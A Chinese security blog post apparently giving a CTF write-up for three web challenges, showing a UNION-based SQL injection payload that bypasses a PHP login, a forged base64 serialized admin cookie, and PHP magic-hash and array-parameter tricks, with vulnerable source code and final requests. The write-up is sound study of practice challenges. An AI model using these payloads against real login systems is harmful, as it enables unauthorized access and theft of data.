<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> week 2 for cnas writeup · Uknow - Stay hungry Stay foolish</title><meta name="description" content="week 2 for cnas writeup - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">week 2 for cnas writeup</h1><div class="post-time">Nov 25, 2017</div><div class="post-content"><!-- ttoc -->
<h2><span id="火星文-50">火星文 50</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28001/" target="_blank" rel="noopener">http://47.100.121.220:28001/</a></p>
<h3><span id="解答">解答</span></h3><p>看到题目就判断为javascript的题目，把火星人A和火星人B的内容复制粘贴到控制台</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E7%81%AB%E6%98%9F%E6%96%87.png" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/%E7%81%AB%E6%98%9F%E6%96%872.png" alt=""></p>
<p>A跑出来是一串密文，B跑出来是一个解密脚本</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/base6.png" alt=""></p>
<h2><span id="用户登录-100">用户登录 100</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28002/" target="_blank" rel="noopener">http://47.100.121.220:28002/</a></p>
<h3><span id="基本知识">基本知识</span></h3><p>mysql_query() 函数</p>
<p>mysql_query() 函数执行一条 MySQL 查询。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(query,connection)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>query</td>
<td style="text-align:center">必需。规定要发送的 SQL 查询。注释：查询字符串不应以分号结束。</td>
</tr>
<tr>
<td>connection</td>
<td style="text-align:center">可选。规定 SQL 连接标识符。如果未规定，则使用上一个打开的连接。</td>
</tr>
</tbody>
</table>
<p>mysql_fetch_array() 函数</p>
<p>mysql_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有<br>返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_fetch_array(data,array_type)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>data</td>
<td style="text-align:center">可选。规定要使用的数据指针。该数据指针是 mysql_query() 函数产生的结果。</td>
</tr>
<tr>
<td>array_type</td>
<td style="text-align:center">可选。规定返回哪种结果。可能的值：MYSQL_ASSOC - 关联数组 MYSQL_NUM - 数字数组 MYSQL_BOTH - 默认。同时产生关联和数字数组</td>
</tr>
</tbody>
</table>
<p>strcasecmp() 函数</p>
<p>strcasecmp() 函数比较两个字符串。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strcasecmp(string1,string2)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>string1</td>
<td style="text-align:center">必需。规定要比较的第一个字符串。</td>
</tr>
<tr>
<td>string2</td>
<td style="text-align:center">必需。规定要比较的第二个字符串。</td>
</tr>
</tbody>
</table>
<p>以上是本题涉及到的几个函数。</p>
<h3><span id="解答">解答</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;config.php&quot;;</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line">if( isset($_POST[&quot;user&quot;]) &amp;&amp; isset($_POST[&quot;pass&quot;])) &#123;</span><br><span class="line">    $user = $_POST[&quot;user&quot;];</span><br><span class="line">    $pass = md5($_POST[&quot;pass&quot;]);</span><br><span class="line">    $auth = false;</span><br><span class="line">    </span><br><span class="line">    $conn = mysql_connect($db_host, $db_user, $db_pass) or die(&quot;Unable to connect!&quot;);</span><br><span class="line">    mysql_select_db($db_name) or die(&quot;Unable to select database!&quot;);</span><br><span class="line">    </span><br><span class="line">    $sql = &quot;select password from user where user=&apos;$user&apos;&quot;;</span><br><span class="line">    $query = mysql_query($sql);</span><br><span class="line">    if(!$query) &#123;</span><br><span class="line">        mysql_close($conn);</span><br><span class="line">        die(&quot;login failed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line">    if($row[&quot;password&quot;] &amp;&amp; !strcasecmp($pass,$row[&quot;password&quot;])) &#123;</span><br><span class="line">        $auth = true;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_close($conn);</span><br><span class="line">    </span><br><span class="line">    if($auth) &#123;</span><br><span class="line">        echo &quot;login success!&quot;;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        die(&quot;login failed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;select password from user where user=&apos;$user&apos;</span><br></pre></td></tr></table></figure>
<p>是存在SQL注入的，但是用户名和密码是分开判断。所以普通的万能密码是不行的。</p>
<p>\$row[“password”]的值是从$sql提取出来的,<br>然后经过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$row[&quot;password&quot;] &amp;&amp; !strcasecmp($pass,$row[&quot;password&quot;])</span><br></pre></td></tr></table></figure></p>
<p>进行密码判断。</p>
<p>我们可以构造如下payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;AND 0=1 UNION SELECT md(1) #</span><br></pre></td></tr></table></figure>
<p>拼接到\$sql<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;select password from user where user=&apos;&apos;AND 0=1 UNION SELECT md5(1) #&quot;</span><br></pre></td></tr></table></figure></p>
<ol>
<li>最前面的单引号：闭合原文的where user=’</li>
<li>AND 0=1:为了使前面的表达式返回值为空.</li>
<li>接着我们使用UNION SELECT MD5(1)，直接把MD5值作为返回值returned给\$sql，这样在查询的时候\$query就会有值.</li>
<li>最后的#用来注释掉后面没用的东西</li>
</ol>
<p>因此<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:&apos; and 0=1 union select md5(1)#</span><br><span class="line">password:1</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/sqlsql.png" alt=""></p>
<h2><span id="you-have-no-permissions-150">You have no permissions 150</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28003/03.php" target="_blank" rel="noopener">http://47.100.121.220:28003/03.php</a></p>
<h3><span id="基础知识">基础知识</span></h3><p>implode() 函数</p>
<p>implode() 函数返回由数组元素组合成的字符串。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">implode(separator,array)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>separator</td>
<td style="text-align:center">可选。规定数组元素之间放置的内容。默认是 “”（空字符串）。</td>
</tr>
<tr>
<td>array</td>
<td style="text-align:center">必需。要组合为字符串的数组。</td>
</tr>
</tbody>
</table>
<h3><span id="解答">解答</span></h3><p>这个题目是绕了一点弯的，周六我做这个题是一点思路没有的</p>
<p>今天重新看了这个题，数据包里只有一个role的cookies。</p>
<p>经过一顿操作，发现这个是base64加密的，解密得到s:5:”guest”;</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/guest.png" alt=""></p>
<p>s:5:”guest”,看起来像一个序列化后的数据，这里我们把guest改成admin试试，admin的长度也是5</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/adminbase64.png" alt=""></p>
<p>得到了czo1OiJhZG1pbiI7，替换cookie传入，进入终于有权限了。得到一份源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$role = &quot;guest&quot;;</span><br><span class="line">$flag = &quot;flag&#123;xxxxxx&#125;&quot;;</span><br><span class="line">$auth = false;</span><br><span class="line">if(isset($_COOKIE[&quot;role&quot;])) &#123;</span><br><span class="line">    if(&quot;admin&quot;===unserialize(base64_decode($_COOKIE[&quot;role&quot;])))</span><br><span class="line">    &#123;</span><br><span class="line">        $auth = true;</span><br><span class="line">        echo &quot;Hello admin, now you can upload something you are easy to forget.&lt;/br&gt;&quot;;</span><br><span class="line">        echo &quot;there are ther source.&lt;/br&gt;&quot;;</span><br><span class="line">        </span><br><span class="line">        if(isset($_POST[&quot;key1&quot;])) &#123;</span><br><span class="line">            $key1 = $_POST[&quot;key1&quot;];</span><br><span class="line">            $md51 = @md5($key1);</span><br><span class="line">            $md52 = @md5(&apos;s155964671a&apos;);</span><br><span class="line">            if(&apos;s155964671a&apos;!=$key1 &amp;&amp; $md51==$md52) &#123;</span><br><span class="line">                if(isset($_POST[&quot;data&quot;])) &#123;</span><br><span class="line">                    $data = $_POST[&quot;data&quot;];</span><br><span class="line">                    $b1 = preg_match(&apos;/[&lt;&gt;?]/&apos;,$data);     //0</span><br><span class="line">                    $s = implode(&quot;&quot;,$data);</span><br><span class="line">                    $b2 = preg_match(&apos;/[&lt;&gt;?]/&apos;,$s);   //1</span><br><span class="line">                    </span><br><span class="line">                    if(!$b1 &amp;&amp; $b2 ) die($flag);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $myfile = fopen(&quot;03.php&quot;, &quot;r&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">        $text = fread($myfile,filesize(&quot;03.php&quot;));</span><br><span class="line">        fclose($myfile);</span><br><span class="line">        $text = str_replace(&quot;xxxxxx&quot;,&quot;xxxxxx&quot;,$text);</span><br><span class="line">        echo &apos;&lt;textarea rows=&quot;10&quot; cols=&quot;40&quot; style=&quot;resize:none&quot; &gt;&apos;;</span><br><span class="line">        echo $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!$auth) &#123;</span><br><span class="line">    setcookie(&quot;role&quot;,&quot;czo1OiJndWVzdCI7&quot;);</span><br><span class="line">    echo &quot;Sory.You have no permissions.&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>分析代码，先看MD5这一块</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&quot;key1&quot;])) &#123;</span><br><span class="line">    $key1 = $_POST[&quot;key1&quot;];</span><br><span class="line">    $md51 = @md5($key1);</span><br><span class="line">    $md52 = @md5(&apos;s155964671a&apos;);</span><br><span class="line">    if(&apos;s155964671a&apos;!=$key1 &amp;&amp; $md51==$md52)</span><br></pre></td></tr></table></figure>
<p>这里是利用PHP语言的弱类型特征：</p>
<ul>
<li>1）将s155964671a进行MD5加密，密文为0e342768416822451524974117254469，发现密文为0e开头，PHP在进行比较运算时，如果遇到了0e\d+这种字符串，就会将这种字符串解析为科学计数法。 </li>
<li>2）因为0exx都等于0，所以让两者相等我们只需再找到一个MD5加密后开头为0e的字符串即可 </li>
<li>3）相关字符串：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">md5(&apos;s878926199a&apos;)=0e545993274517709034328855841020</span><br><span class="line">md5(&apos;QNKCDZO&apos;)=0e342768416822451524974117254469</span><br></pre></td></tr></table></figure>
<p>这里我们就可以构造一个key变量，key的传入值为QNKCDZO或者s878926199a</p>
<p>继续看后面的代码，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&quot;data&quot;])) &#123;</span><br><span class="line">    $data = $_POST[&quot;data&quot;];</span><br><span class="line">    $b1 = preg_match(&apos;/[&lt;&gt;?]/&apos;,$data);     //0</span><br><span class="line">    $s = implode(&quot;&quot;,$data);</span><br><span class="line">    $b2 = preg_match(&apos;/[&lt;&gt;?]/&apos;,$s);   //1</span><br><span class="line">    </span><br><span class="line">    if(!$b1 &amp;&amp; $b2 ) die($flag);</span><br></pre></td></tr></table></figure>
<p>impode函数是把数组的元素组成字符串的，如注释\$b1需要返回0，\$b2需要返回1.</p>
<p>简单的做了个测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data = array(&quot;/[&lt;&gt;?]/&quot;); </span><br><span class="line">if($item = preg_match(&quot;/[&lt;&gt;?]/&quot;,$data))&#123;</span><br><span class="line"> echo &apos;1&lt;hr /&gt;&apos;; </span><br><span class="line">&#125;else &#123; </span><br><span class="line"> echo &apos;0&lt;hr /&gt;&apos;; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$s = implode(&quot;&quot;,$data);</span><br><span class="line">echo $s ;</span><br><span class="line">echo &apos;&lt;hr /&gt;&apos;;</span><br><span class="line">if($b2 = preg_match(&apos;/[&lt;&gt;?]/&apos;,$s))</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line"> echo &apos;1&lt;hr /&gt;&apos;; </span><br><span class="line">&#125;else &#123; </span><br><span class="line"> echo &apos;0&lt;hr /&gt;&apos;; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/tesrceshi.png" alt=""></p>
<p>可以看出来，传入一个[&lt;&gt;?]是可以直接得到我们想要的返回值的。但是直接传data=[&lt;&gt;?]是不行的</p>
<p>这里我们可以这样传入 data[]=[&lt;&gt;?] 当做一个数组传入，符合了代码的意思</p>
<p>再做一个简单的测试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">var_dump( $_POST[&quot;a&quot;]);</span><br><span class="line">echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">print_r( $_POST[&quot;a&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shuzuceshi.png" alt=""></p>
<p>这里我们可以看出我们这样传参就是传入了一个数组了。</p>
<p>最后的payload就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Cookie: role=czo1OiJhZG1pbiI7</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">key1=s878926199a&amp;data[]=[&lt;&gt;?]</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/flag11111111.png" alt=""></p>
</div></article></div></section><footer><div class="paginator"><a href="/posts/ctf/week-3-for-cnas-writeup.html" class="prev">上一篇</a><a href="/posts/notes/php内置过滤函数总结.html" class="next">下一篇</a></div><div class="copyright"><p>© 2016 - 2019 <a href="https://uknowsec.cn">uknow</a>  Stay hungry,Stay foolish.</p></div></footer></div><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-115504647-1",'auto');ga('send','pageview');</script><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?225ebcce29d319519ac7c7690425d1d4";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script></body></html>